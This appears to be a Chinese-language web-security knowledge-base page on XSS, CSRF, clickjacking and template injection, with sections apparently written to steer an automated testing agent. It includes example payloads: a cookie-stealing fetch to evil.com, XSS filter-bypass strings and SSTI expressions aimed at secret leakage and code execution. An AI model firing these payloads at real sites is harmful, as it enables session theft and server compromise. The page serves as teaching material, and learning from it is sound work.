# XSS、注入与前端安全攻击

> 知识库层级：Level 1 - Web 安全基础
> 日期：2026-06-04
> 来源：OWASP, PortSwigger Research, Google Security Blog, SANS

## 一、跨站脚本（XSS）— 根本原理

### 1.1 什么是 XSS？——从底层理解

XSS 的本质是：**用户的输入被当作代码执行了**。

浏览器在渲染网页时，会解析 HTML、CSS、JavaScript。如果攻击者能控制一部分输入，且输入被当作 HTML/JS 解析而不是纯文本，就产生了 XSS。

```
用户输入: <script>alert('xss')</script>
              ↓
HTML 输出: <div>用户评论: <script>alert('xss')</script></div>
              ↓
浏览器解析: 把 <script> 当作 JS 代码执行，而不是文本显示
```

**核心矛盾：** Web 应用需要在用户输入中包含 HTML（富文本编辑器、Markdown 渲染），但又不能信任用户输入。这个矛盾是所有 XSS 问题的根源。

### 1.2 XSS 的三类（按注入位置）

#### ① 反射型 XSS（Reflected XSS）

**原理：** 输入在请求中（URL 参数），服务器未转义直接写入响应。

```
攻击者构造 URL:  https://example.com/search?q=<script>alert(1)</script>
服务器响应:       <div>您搜索的: <script>alert(1)</script> 没有结果</div>
浏览器执行:      alert(1) 执行
```

**典型场景：** 搜索页面、错误页面、URL 参数回显
**利用方式：** 需要用户点击恶意链接（社会工程学）
**危害：** 窃取 Cookie、钓鱼、CSRF 令牌窃取

#### ② 存储型 XSS（Stored XSS）

**原理：** 输入存储在服务器（数据库），后续用户访问时服务器输出未转义。

```
攻击者发帖: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
服务器存储: 数据库保存了恶意脚本
其他用户访问: 服务器返回帖子内容，浏览器执行脚本
攻击者收到: 所有访问用户的 Cookie
```

**典型场景：** 评论区、用户资料、博客文章、论坛帖子
**危害：** 任何访问该页面的用户都会受害，是最危险的 XSS 类型

#### ③ DOM 型 XSS（DOM-based XSS）

**原理：** 输入在客户端（URL hash、postMessage、localStorage）被 JavaScript 直接注入 DOM。

```javascript
// 漏洞代码
var name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = '你好，' + name;
// 问题: innerHTML 会将用户输入解析为 HTML，而不是纯文本

// 修复
document.getElementById('greeting').textContent = '你好，' + name;
// textContent 将内容设为纯文本，不会解析 HTML
```

**典型场景：** SPA 应用、前端路由、框架模板引擎
**危害：** 绕过服务器端过滤，客户端专用

### 1.3 XSS 的底层原因

| 原因 | 说明 | 例子 |
|------|------|------|
| **HTML 编码不一致** | 数据输出到 HTML 不同上下文需要不同编码 | HTML 属性、JS 字符串、CSS 各有编码规则 |
| **innerHTML 与 textContent 混淆** | `innerHTML` 解析 HTML，`textContent` 不解析 | 误用 innerHTML |
| **eval 与 setTimeout 字符串** | `eval()` 把字符串当作代码执行 | `eval('alert('+input+')')` |
| **模板引擎配置不当** | 某些模板引擎默认不转义 | React 的 `dangerouslySetInnerHTML` |
| **富文本过滤绕过** | 黑名单过滤总有遗漏 | `<svg><onload>`、`<img/src=x onerror=>` |

### 1.4 CSP 绕过技术（从底层理解）

即使启用了 CSP，以下绕过技术值得深入理解：

| 技术 | 原理 | 绕过条件 |
|------|------|----------|
| **JSONP 劫持** | `https://api.example.com/callback?jsonp=alert(1)` — 利用存在 JSONP 接口的域名绕过 CSP 的 script-src | CSP 允许了存在 JSONP 的域名 |
| **Angular/React 模板注入** | 某些框架在 CSP strict-dynamic 下仍可执行不可信代码 | `ng-csp` 白名单过大 |
| **Dangling Markup** | 不闭合的 HTML 标签窃取页面内容 | 页面中有 `<form action=` 等 |
| **Base URL 注入** | 通过 `<base>` 标签改变相对路径的解析 | CSP 未限制 base-uri |
| **CDN 劫持** | 如果 CSP 允许了 `cdnjs.cloudflare.com`，攻击者找到该 CDN 上可上传的资源 | 宽松的 script-src |

---

## 二、跨站请求伪造（CSRF）

### 2.1 根本原理

CSRF 的本质是：**浏览器自动携带认证凭证（Cookie）访问目标网站**。

```
用户已登录银行 https://bank.com（Cookie 在浏览器中）

攻击者构造页面 <img src="https://bank.com/transfer?to=attacker&amount=1000">
用户访问攻击者页面
浏览器自动请求 https://bank.com/transfer?to=attacker&amount=1000
浏览器自动携带 bank.com 的 Cookie
银行服务器收到请求 → Cookie 验证通过 → 转账成功！
```

**关键机制：** 
- Cookie 是"基于源的客户端存储"，浏览器会自动附加到匹配的请求中
- `<img>`, `<script>`, `<iframe>`, `<form>` 等标签可以发起跨源请求
- 服务器无法区分请求是用户"主动点击"的还是"自动发起的"

### 2.2 CSRF 防御的底层逻辑

所有 CSRF 防御的核心思路都是：**让请求携带攻击者无法构造的信息**。

| 防御方式 | 原理 | 弱点 |
|----------|------|------|
| **CSRF Token** | 页面中嵌入随机 Token，请求时校验 | Token 可能被 XSS 窃取 |
| **SameSite Cookie** | Cookie 标记 `SameSite=Strict/Lax`，浏览器限制跨站发送 | 旧浏览器不支持；Lax 下 POST 仍可发送 |
| **Referer/Origin 校验** | 检查请求头中的来源 | 某些场景 Referer 丢失 |
| **二次验证** | 敏感操作要求输入密码/验证码 | 用户体验差 |

### 2.3 SameSite Cookie 深入

SameSite 是浏览器层面的 CSRF 防御机制：

| 值 | 行为 | 安全性 |
|----|------|--------|
| `None` | 所有请求都携带 Cookie（含跨站） | ❌ 无 CSRF 保护 |
| `Lax` | GET 等安全方法跨站携带，POST 不携带 | ✅ 基本保护 |
| `Strict` | 所有跨站请求都不携带 Cookie | ✅ 最强保护，但影响用户体验 |

**2025 年主流浏览器默认行为：** Chrome/Firefox/Edge 均将未设置 SameSite 的 Cookie 默认为 `SameSite=Lax`。

---

## 三、点击劫持（Clickjacking）

### 3.1 原理

点击劫持利用 `<iframe>` 将目标网站嵌入攻击者页面，通过透明层欺骗用户点击。

```
攻击者页面布局:
┌─────────────────────────┐
│                         │
│  精美奖品免费领取！       │  ← 用户看到的（可见层）
│  点击领取 ↓              │
│                         │
│  ┌───────────────────┐  │
│  │ [关注并分享]       │  │  ← 透明 iframe 里的银行转账按钮
│  └───────────────────┘  │
│                         │
└─────────────────────────┘
```

### 3.2 防御

```http
# 服务器响应头 — 禁止被嵌入 iframe
X-Frame-Options: DENY
# 或 Content-Security-Policy
Content-Security-Policy: frame-ancestors 'self';
```

---

## 四、HTML 注入与模板注入（Server-Side Template Injection）

### 4.1 模板注入原理

当用户输入被直接拼接进模板引擎时：

```python
# 漏洞代码（Flask + Jinja2）
template = "欢迎，" + user_input  # 用户输入 {{config}}
rendered = jinja2(template)  # 这里执行了模板语法！

# 攻击者输入: {{config.SECRET_KEY}} → 泄露密钥
# 攻击者输入: {{''.__class__.__mro__[2].__subclasses__()}} → RCE
```

**从底层看：** 模板引擎把"代码"和"数据"混在了一起。开发者以为用户输入是"数据"，但模板引擎把它当成了"代码"来执行。

### 4.2 注入攻击的统一模型

所有注入攻击共享同一个底层模型：

```
用户输入 → 被解释器处理 → 产生非预期行为

SQL 注入:    输入 → SQL 解释器 → 执行恶意 SQL
XSS:         输入 → HTML 解析器 → 执行恶意 JS
SSTI:        输入 → 模板引擎 → 执行恶意模板表达式
命令注入:    输入 → Shell 解释器 → 执行恶意命令
LDAP 注入:   输入 → LDAP 解释器 → 执行恶意 LDAP 查询
XXE:         输入 → XML 解析器 → 读取本地文件
```

**防御的统一原则：** 
1. **参数化/Prepared Statement** — 让解释器明确知道"代码"和"数据"的边界
2. **输出编码** — 在不同上下文中使用正确的编码规则
3. **最小权限** — 解释器以最小权限运行

---

## 五、从原理推导攻击方向

### 5.1 浏览器安全机制的内在矛盾

```
同源策略 (SOP) 想要: 完全隔离不同源
Web 开发者想要: 跨源共享资源 (API、CDN、嵌入)
             ↓
      需要折中方案: CORS、postMessage、JSONP
             ↓
      折中方案产生新的攻击面
```

### 5.2 从"浏览器如何执行代码"推导攻击

| 浏览器机制 | 正常行为 | 被滥用的方式 |
|-----------|---------|-------------|
| 浏览器自动解析 `<script>` | 执行同站 JS | 存储型 XSS 注入 `<script>` |
| 浏览器自动携带 Cookie | 用户无感知认证 | CSRF（同站请求伪造） |
| 跨源请求默认允许 | 嵌入图片、CDN 脚本 | CSRF、XS-Leaks |
| `<iframe>` 嵌入 | 嵌入第三方内容 | 点击劫持 |
| service worker | 离线缓存优化 | 持久化 XSS（SW 劫持） |
| postMessage | 跨窗口通信 | 消息来源未校验 → 数据泄露 |

### 5.3 真实世界攻击链中 Web 安全的角色

```
信息收集阶段:  目录扫描 → 敏感端点 → JS 文件分析
              ↓
漏洞发现:     XSS/Cookie 安全/CSRF/CORS 配置错误
              ↓
漏洞利用:     XSS 窃取 Token → CSRF 修改配置 → 获取敏感数据
              ↓
横向移动:     利用窃取的凭据访问其他系统
```

**关键洞察：** 在真实渗透中，XSS 很少是**终点**，更多是**跳板**——帮攻击者获取 Token、Cookie、CSRF 令牌，然后进一步深入系统。

---

## 【LLM 推理段 — XSS】

### 触发条件
- 端口: 80/443/8080/8443（任何 HTTP 服务）
- 技术栈: 任何需要用户输入后回显的服务（搜索、表单、评论）
- 业务场景: 评论区、用户资料编辑、URL 参数回显、富文本编辑器
- 特别注意: 搜索页面、错误页面、用户头像/昵称展示点

### 检测信号
| 信号类型 | 具体表现 | 置信度 | 检测方法 |
|---------|---------|--------|---------|
| 端口/协议 | 80/443 HTTP | 低 | nmap |
| 输入回显 | 参数值出现在响应体中 | 中 | 手动传任意值看回显位置 |
| 编码问题 | 尖括号被保留显示在页面 | 高 | 传 `<test>` 看是否原样输出 |
| 报错 | 页面报 JavaScript 语法错误 | 高 | 传 `"` 看页面是否崩溃 |
| CSP 头缺失 | 响应头没有 Content-Security-Policy | 中 | 检查响应头 |

### 验证步骤（按优先级）
1. **反射型 XSS**: 传 `<script>alert(1)</script>` 到 URL 参数 → 弹出对话框 → 确认存在
2. **存储型 XSS**: 在可持久化输入点（评论/资料）写入 `<img src=x onerror=alert(1)>` → 其他用户访问时弹窗 → 确认存在
3. **DOM 型 XSS**: 传 `#<script>alert(1)</script>` 到 URL hash → 页面响应中无此内容但弹窗 → 确认存在
4. **绕过尝试**: 如果尖括号被过滤，尝试 `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、`<body onload=alert(1)>`
5. **确认标准**: 弹窗出现 → 漏洞确认。进一步传 `document.cookie` 验证可利用性

### 利用链扩展
| 利用成功后可做 | 前置条件 | 后续攻击面 |
|--------------|---------|-----------|
| Cookie 窃取 | Cookie 未设 HttpOnly | 会话劫持、登录绕过 |
| 页面内容篡改 | 无需额外条件 | 钓鱼、伪造登录表单 |
| 用户操作模拟 | CSRF token 可读 | 越权操作（改密、转账）|
| 键盘记录 | 无 CSP 限制 | 窃取凭证 |
| 内部网络扫描 | 浏览器允许内网请求 | 横向移动 |

### 关联攻击面
- **CSRF**: XSS 可以读取 CSRF token，组合使用直接完成越权操作
- **CSP 绕过**: 如果 CSP 配置为白名单模式，找 JSONP 端点绕过
- **点击劫持**: XSS + 点击劫持组合提升攻击成功率
- **SSTI**: 如果模板引擎未正确转义，可能同时存在 SSTI 和 XSS

### 防御识别
- 响应头有 `Content-Security-Policy` → 有 CSP 防御
- 输入输出做了 HTML 实体编码 → `<` 变成 `&lt;` → 反射型 XSS 被防御
- Cookie 有 `HttpOnly` → XSS 无法窃取 Cookie
- 设置 `X-XSS-Protection: 1; mode=block` → 浏览器内置防御（仅限反射型）

### 常见误判
- 输入被转义但输出位置在 `<script>` 标签内 → 不需要 `< >` 也能注入，容易漏判
- 富文本编辑器允许部分 HTML 标签 → 可能通过 `onerror` 等事件属性注入
- 参数在 JS 字符串中回显 → 需要闭合引号而非尖括号

---

## 【LLM 推理段 — CSRF】

### 触发条件
- 任何需要登录后的状态变更操作（改密、转账、发帖）
- 未在关键操作验证请求来源（Origin/Referer）
- 未使用 CSRF token 或 token 可预测

### 检测信号
| 信号类型 | 具体表现 | 置信度 | 检测方法 |
|---------|---------|--------|---------|
| 请求头 | 无 Origin/Referer 校验 | 中 | 发送跨站请求测试 |
| 表单 | 表单中无隐藏 token 字段 | 高 | 查看页面源码 |
| API | 请求头无自定义 token | 中 | 抓包看请求结构 |
| Cookie | SameSite=None/未设置 | 低 | 检查 Set-Cookie 头 |

### 验证步骤
1. 构造一个跨站请求页面 → 诱使用户访问 → 看操作是否被执行
2. 确认标准: 用户在未授权的情况下，操作被执行

### 利用链扩展
- 账号接管（改密接口无 CSRF token）
- 资金转移（转账接口无来源校验）
- 信息泄露（修改用户资料为攻击者邮箱）

---

## 【LLM 推理段 — 模板注入 SSTI】

### 触发条件
- 技术栈: Jinja2 (Python/Flask)、Twig (PHP/Symfony)、Velocity (Java)
- 用户输入被直接传入模板引擎渲染
- 典型场景: 用户姓名/欢迎语、邮件模板、错误页面模板

### 检测信号
| 信号类型 | 具体表现 | 置信度 |
|---------|---------|--------|
| 花括号响应 | 输入 `{{7*7}}` 返回 `49` | 高 |
| 模板语法报错 | 输入 `{{` 返回服务端错误信息 | 高 |
| 技术栈确认 | whatweb 扫描到 Flask/Symfony 等 | 中 |

### 验证步骤
1. 传 `{{7*7}}` → 响应为 `49` → SSTI 确认
2. 进一步: `{{config}}` 看配置泄露、`{{self.__class__.__mro__}}` 看 RCE 可能性

### 利用链扩展
- 配置泄露 → 数据库密码、API Key
- 代码执行 → 服务器沦陷
